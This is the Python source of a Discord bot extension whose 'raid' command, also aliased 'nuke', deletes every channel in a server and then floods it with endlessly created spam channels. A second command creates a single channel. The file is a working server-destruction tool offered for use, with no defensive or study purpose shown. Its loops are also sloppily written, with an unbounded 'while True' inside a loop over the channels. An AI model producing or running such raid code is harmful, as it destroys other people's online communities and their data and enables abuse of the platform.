import discord
from discord.ext import commands

class cmd(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=['rd', 'nuke', 'nk'])
    async def raid(self, ctx, text='RAIDED'):
        await ctx.message.delete()
        guild = ctx.guild

        if text=="RAIDED":
            for channel in guild.channels:
                await channel.delete()
            for x in guild.channels:
                while True:
                    await ctx.guild.create_text_channel(text)

            print(f"[>]RAID was executed on default settings")
        else:
            for channel in guild.channels:
                await channel.delete()
            for x in guild.channels:
                while True:
                    await ctx.guild.create_text_channel(text)
            print(f"[>]RAID was executed")

    @commands.command(aliases=['cch', 'channel'])
    async def createchannel(self, ctx, text="CHANNEL"):
        await ctx.message.delete()

        if text=="CHANNEL":
            await ctx.guild.create_text_channel(text)
            print(f"[>]CreateCHANNEL was created with default settings")
        else:
            await ctx.guild.create_text_channel(text)
            print(f"[>]CreateCHANNEL was created")
        
def setup(bot):
    bot.add_cog(cmd(bot))